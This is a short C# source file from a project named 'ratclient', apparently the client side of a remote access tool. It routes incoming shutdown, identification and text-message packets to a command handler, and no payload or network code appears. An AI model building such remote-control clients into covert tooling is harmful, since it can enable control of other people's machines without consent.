
using ratclient.Interfaces;
using ratclient.Networking;
using ratclient.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ratclient.Handlers
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            Type packetType = packet.GetType();
            if (packetType == typeof(DoShutdownPacket))
            {
                CommandHandler.HandleCommand(client, (DoShutdownPacket)packet);
            } else if (packetType == typeof(IdentificationPacket ))
            {
                CommandHandler.HandleCommand(client, (IdentificationPacket)packet);
            } else if (packetType == typeof(StringMessagePacket))
            {
                CommandHandler.HandleCommand(client, (StringMessagePacket)packet);
            }
        }
    }
}
